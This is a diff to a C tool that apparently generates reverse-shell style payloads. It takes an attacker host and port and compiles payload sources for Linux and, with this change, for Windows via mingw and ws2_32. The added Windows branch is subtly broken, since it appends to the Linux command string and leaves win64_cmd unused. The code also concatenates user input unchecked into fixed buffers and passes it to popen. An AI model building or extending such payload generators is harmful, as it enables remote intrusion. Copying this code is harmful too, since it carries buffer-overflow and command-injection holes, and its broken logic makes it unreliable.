@@ -88,7 +88,10 @@ int main(int argc, char **argv){
       char outfile[50];
       char lhost[50];
       char port[30];
-      char unix_cmd[100] = "gcc payload.c -o ";
+      char unix_cmd[100] = "gcc payload_linux.c -o ";
+      char win64_cmd[150] = "x86_64-w64-mingw32-gcc payload_win.c -o ";
+      char winlib[30] = " -lws2_32";
+
       for(int i = 0; argv[i]; i++){
         if(strcmp(argv[i], "--platform") == 0 || strcmp(argv[i], "-w") == 0){
           strcpy(platform, argv[i + 1]);
@@ -110,6 +113,7 @@ int main(int argc, char **argv){
 
       if(strcmp(platform, "linux") == 0){
          // build command string
+         // gcc payload_linux.c -D PORT=4444 -D target=\"127.0.0.1\" -o payload
          strcat(unix_cmd, outfile);
          strcat(unix_cmd, param);
          strcat(unix_cmd, portvar);
@@ -120,7 +124,25 @@ int main(int argc, char **argv){
          strcat(unix_cmd, lhost);
          strcat(unix_cmd, ip_escape);
          popen(unix_cmd, "r");
-         printf("Generated payload successfully\n");
+         printf("Generated payload successfully for platform: %s\n", platform);
+      }
+      else if(strcmp(platform, "windows") == 0){
+         // build command string
+         // x86_64-w64-mingw32-gcc payload_win.c -o win32.exe -D LHOST=\"127.0.0.1\" -D PORT=4444 -lws2_32
+         strcat(unix_cmd, outfile);
+         strcat(unix_cmd, param);
+         strcat(unix_cmd, portvar);
+         strcat(unix_cmd, port);
+         strcat(unix_cmd, param);
+         strcat(unix_cmd, targetvar);
+         strcat(unix_cmd, ip_escape);
+         strcat(unix_cmd, lhost);
+         strcat(unix_cmd, ip_escape);
+         strcat(unix_cmd, winlib);
+         popen(unix_cmd, "r");
+         printf("Generated payload successfully for platform: %s\n", platform);
+          
+        
       }
       
     }
